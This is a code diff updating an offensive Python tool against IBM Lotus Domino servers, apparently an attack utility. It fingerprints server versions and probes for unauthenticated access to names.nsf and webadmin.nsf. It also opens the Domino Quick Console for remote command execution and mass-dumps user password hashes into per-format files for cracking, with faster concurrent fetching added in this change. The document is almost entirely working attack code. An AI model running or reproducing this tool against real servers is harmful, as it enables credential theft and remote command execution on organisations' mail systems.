@@ -20,12 +20,15 @@
 # SOFTWARE.
 import argparse
 import cmd
-import grequests
 import re
 import requests
 import sys
 import urllib
 from bs4 import BeautifulSoup
+from simple_requests import Requests
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 class Interactive(cmd.Cmd):
 	"""Interact with Domino Quick Console through web requests"""
@@ -89,6 +92,8 @@ class Interactive(cmd.Cmd):
 
 # Get Domino version
 def fingerprint(url, header):
+	domino_version = None
+
 	version_files = ['download/filesets/l_LOTUS_SCRIPT.inf', 
 			'download/filesets/n_LOTUS_SCRIPT.inf',
 			'download/filesets/l_SEARCH.inf',
@@ -98,19 +103,22 @@ def fingerprint(url, header):
 	for version_file in version_files:
 		try:
 			version_url = "{0}/{1}".format(url, version_file)
-			request = requests.get(version_url, headers=header, verify=False)
+			request = requests.get(version_url, timeout=(5), headers=header, verify=False)
 			if request.status_code == 200:
-				domino_version = re.search("(?i)version=([0-9].[0-9].[0-9])", request.text)
-				if domino_version:
-					return domino_version.group(1)
+				version_regex = re.search("(?i)version=([0-9].[0-9].[0-9])", request.text)
+				if version_regex:
+					domino_version = version_regex.group(1)
+					break
 			else:
 				continue
 
-		except Exception as error:
-			print_error("Error: {0}".format(error))
+		except:
 			continue
 
-	return None
+	if domino_version:
+		print_good("Domino version: {0}".format(version_regex.group(1)))
+	else:
+		print_warn('Unable to fingerprint Domino version!')
 
 # Check for open authentication to names.nsf and webadmin.nsf
 def check_portals(url, header):
@@ -120,51 +128,58 @@ def check_portals(url, header):
 			portal_url = "{0}/{1}".format(url, portal)
 			request = requests.get(portal_url, headers=header, verify=False)
 			if request.status_code == 200:
-				print_good("{0}/{1} does NOT require authentication!".format(url, portal))
+				if 'form method="post"' in request.text:
+					print_warn("{0}/{1} requires authentication".format(url, portal))
+				else:
+					print_good("{0}/{1} does NOT require authentication".format(url, portal))
 			elif request.status_code == 401:
-				print_warn("{0}/{1} requires authentication".format(url, portal))
+				print_warn("{0}/{1} requires authentication!".format(url, portal))
 			else:
-				print_error("Could not find {0}!".format(portal))
+				print_warn("Could not find {0}!".format(portal))
 
-		except Exception as error:
-			print_error("Error: {0}".format(error))
+		except:
 			continue
 
 # Check access to webadmin.nsf and get local file path
 def check_access(url, header, username, password):
 	session = requests.Session()
 	session.auth = (username, password)
+	who_am_i, local_path = None, None
 
 	try:
 		webadmin_url = "{0}/webadmin.nsf".format(url)
 		check_webadmin = session.get(webadmin_url, headers=header, verify=False)
 		if check_webadmin.status_code == 200:
-			path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(url)
-			check_path = session.get(path_url, headers=header, verify=False)
-			path_regex = re.search('>(?i)([a-z]:\\\\[a-z0-9()].+\\\\[a-z].+)\\\\domino\\\\data', check_path.text)
-			if path_regex:
-				path = path_regex.group(1)
+			if 'form method="post"' in check_webadmin.text:
+				print_warn('Unable to access webadmin.nsf, maybe you are not admin?')
 			else:
-				path = None
-				print_status('Could not identify Domino file path, trying defaults...')
+				path_url = "{0}/webadmin.nsf/fmpgHomepage?ReadForm".format(url)
+				check_path = session.get(path_url, headers=header, verify=False)
+				path_regex = re.search('>(?i)([a-z]:\\\\[a-z0-9()].+\\\\[a-z].+)\\\\domino\\\\data', check_path.text)
+				if path_regex:
+					path = path_regex.group(1)
+				else:
+					path = None
+					print_status('Could not identify Domino file path, trying defaults...')
+
+				who_am_i, local_path = test_command(url, header, path, username, password)
 		elif check_webadmin.status_code == 401:
-			print_error('Unable to access webadmin.nsf, try with an admin account!')
-			sys.exit(0)
+			print_warn('Unable to access webadmin.nsf, maybe you are not admin?')
 		else:
-			print_error('Unable to find webadmin.nsf!')
-			sys.exit(0)
+			print_warn('Unable to find webadmin.nsf!')
 
 	except Exception as error:
 		print_error("Error: {0}".format(error))
-		sys.exit(0)
 
-	who_am_i, local_path = test_command(url, header, path, username, password)
-	return who_am_i, local_path
+	if who_am_i and local_path:
+		print_good("Running as {0}".format(who_am_i))
+		return local_path
 
-# Ensure Domino Quick Console is working
+# Test outfile redirection
 def test_command(url, header, path, username, password):
 	session = requests.Session()
 	session.auth = (username, password)
+	who_am_i, local_path = None, None
 
 	# Default Domino install paths
 	paths = ['C:\\Program Files\\IBM\\',            # 9.0.1 Windows x64
@@ -192,78 +207,79 @@ def test_command(url, header, path, username, password):
 			if send_command.status_code == 200:
 				get_response = session.get(response_url, headers=header, verify=False)
 				if get_response.status_code == 200:
-					get_user = re.search(".+\\\\(.+)", get_response.text)
-					if get_user:
-						return get_user.group(1), local_path
+					user_regex = re.search(".+\\\\(.+)", get_response.text)
+					if user_regex:
+						who_am_i = user_regex.group(1)
+						break
 
-		except Exception as error:
-			print_error("Error: {0}".format(error))
+		except:
+			continue
 
-	return None, None
+	return who_am_i, local_path
 
 # Get user profile URLs
 def enum_accounts(url, header, username, password):
 	accounts = []
+	account_urls = []
 	session = requests.Session()
 	session.auth = (username, password)
 
-	for page in range(1, 100000, 30):
+	for page in range(1, 100000, 1000):
 		try:
-			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}".format(url, page)
+			pages = "{0}/names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={1}&Count=1000".format(url, page)
 			request = session.get(pages, headers=header, timeout=(60), verify=False)
 			if request.status_code == 200:
-				soup = BeautifulSoup(request.text, 'lxml')
-				empty_page = soup.findAll('h2')
-				if empty_page:
+				if 'form method="post"' in request.text:
+					print_warn('Unable to access names.nsf, bad username or password!')
 					break
 				else:
-					links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
-					for link in links:
-						match = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
-						if match and match.group(1) not in accounts:
-							accounts.append(match.group(1))
-						else:
-							pass
+					soup = BeautifulSoup(request.text, 'lxml')
+					empty_page = soup.findAll('h2')
+					if empty_page:
+						break
+					else:
+						links = [a.attrs.get('href') for a in soup.select('a[href^=/names.nsf/]')]
+						for link in links:
+							account_regex = re.search("/(([a-fA-F0-9]{32})/([a-fA-F0-9]{32}))", link)
+							if account_regex and account_regex.group(1) not in accounts:
+								accounts.append(account_regex.group(1))
+							else:
+								pass
 			elif request.status_code == 401:
-				print_error('Unable to access names.nsf, bad username or password!')
-				sys.exit(0)
+				print_warn('Unable to access names.nsf, bad username or password!')
+				break
 			else:
-				print_error('Could not connect to Domino server!')
+				print_warn('Could not connect to Domino server!')
+				break
 
 		except Exception as error:
 			print_error("Error: {0}".format(error))
 			break
 
-	print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
-	async_requests(accounts, url, header, username, password)
+	if len(accounts) > 0:
+		print_good("Found {0} accounts, dumping hashes".format(len(accounts)))
+		for unid in accounts:
+			account_urls.append("{0}/names.nsf/{1}?OpenDocument".format(url, unid))
 
-# Asynchronously get hashes
-def async_requests(accounts, url, header, username, password):
-	NUM_SESSIONS = 20
-	sessions = [requests.Session() for i in range(NUM_SESSIONS)]
-	async_list = []
-	i = 0
+		async_requests(account_urls, header, username, password)
 
-	for unid in accounts:
-		try:
-			profile = "{0}/names.nsf/{1}?OpenDocument".format(url, unid)
-			action_item = grequests.get(profile,
-				hooks={'response':get_domino_hash},
-				session=sessions[i % NUM_SESSIONS],
-				auth=(username, password),
-				headers=header,
-				verify=False
-			)
-			async_list.append(action_item)
-			i += 1
+# Asynchronously get accounts
+def async_requests(accounts, header, username, password):
+	requests = Requests(concurrent=40)
+	requests.session.headers = header
+	requests.session.auth = (username, password)
+	requests.session.verify = False
 
-		except KeyboardInterrupt as key:
-			break
+	try:
+		for account_url in requests.swarm(accounts, maintainOrder=False):	
+			if account_url.status_code == 200:
+				get_domino_hash(account_url)
 
-	grequests.map(async_list, size=NUM_SESSIONS * 5)
+	except KeyboardInterrupt:
+		requests.stop(killExecuting=True)
 
 # Dump Domino hashes
-def get_domino_hash(response, **kwargs):
+def get_domino_hash(response):
 	soup = BeautifulSoup(response.text, 'lxml')
 
 	try:
@@ -274,7 +290,6 @@ def get_domino_hash(response, **kwargs):
 			if len(domino_username) > 0:
 				break
 			else:
-				domino_username = None
 				continue
 
 		# Get account hash
@@ -282,20 +297,37 @@ def get_domino_hash(response, **kwargs):
 		for hash_param in hash_params:
 			domino_hash = (soup.find('input', attrs={'name':hash_param}))['value']
 			if len(domino_hash) > 0:
-				# Lotus Notes/Domino 5 Format
-				if len(domino_hash) > 22:
-					domino_hash = domino_hash.strip('()')
-					break
+				break
 			else:
-				domino_hash = None
 				continue
+
 	except:
 		pass
 
-	if domino_username is None or domino_hash is None:
-		pass
-	else:
-		print "{0}, {1}".format(domino_username, domino_hash)
+	if domino_username and domino_hash:
+		print "{0}, {1}".format(domino_username.encode('utf-8'), domino_hash)
+		write_hash(domino_username.encode('utf-8'), domino_hash)
+
+# Sort and write hashes to file
+def write_hash(duser, dhash):
+		# Lotus Domino 5 format: 3dd2e1e5ac03e230243d58b8c5ada076
+		if len(dhash) == 34:
+			with open('domino_5_hashes.txt', 'a') as format_five:
+				hash_format = "{0}:{1}\n".format(duser, dhash.strip('()'))
+				format_five.write(hash_format)
+			format_five.close()
+		# Lotus Domino 6 format: (GDpOtD35gGlyDksQRxEU)
+		elif len(dhash) == 22:
+			with open('domino_6_hashes.txt', 'a') as format_six:
+				hash_format = "{0}:{1}\n".format(duser, dhash)
+				format_six.write(hash_format)
+			format_six.close()
+		# Lotus Domino 8 format: (HsjFebq0Kh9kH7aAZYc7kY30mC30mC3KmC30mCluagXrvWKj1)
+		else:
+			with open('domino_8_hashes.txt', 'a') as format_eight:
+				hash_format = "{0}:{1}\n".format(duser, dhash)
+				format_eight.write(hash_format)
+			format_eight.close()
 
 def print_error(msg):
 	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
@@ -350,26 +382,20 @@ if __name__ == '__main__':
 
 	# Process Domino URL
 	if args.url:
-		url = re.search("((https?)://([a-zA-Z0-9.-]+))", args.url)
-		if url:
-			target = url.group(1)
+		url_regex = re.search("((https?)://([a-zA-Z0-9.-]+))", args.url)
+		if url_regex:
+			target = url_regex.group(1)
 		else:
-			print_error("Please provide a valid URL!")
-			sys.exit(0)
+			print_warn("Please provide a valid URL!")
 	else:
 		parser.parse_args('-h'.split())
-		sys.exit(0)
 
 	# Interact with quick console
 	if args.quickconsole:
 		print_status('Accessing Domino Quick Console...')
-		who_am_i, local_path = check_access(target, HEADER, username, password)
-		if who_am_i:
-			print_good("Running as {0}".format(who_am_i))
+		local_path = check_access(target, HEADER, username, password)
+		if local_path:
 			Interactive().cmdloop()
-		else:
-			print_error('Could not access Domino Quick Console!')
-			sys.exit(0)
 
 	# Dump hashes
 	elif args.hashdump:
@@ -379,6 +405,5 @@ if __name__ == '__main__':
 	# Fingerprint
 	else:
 		print_status('Fingerprinting Domino server...')
-		version = fingerprint(target, HEADER)
-		print_good("Domino version: {0}".format(version))
+		fingerprint(target, HEADER)
 		check_portals(target, HEADER)
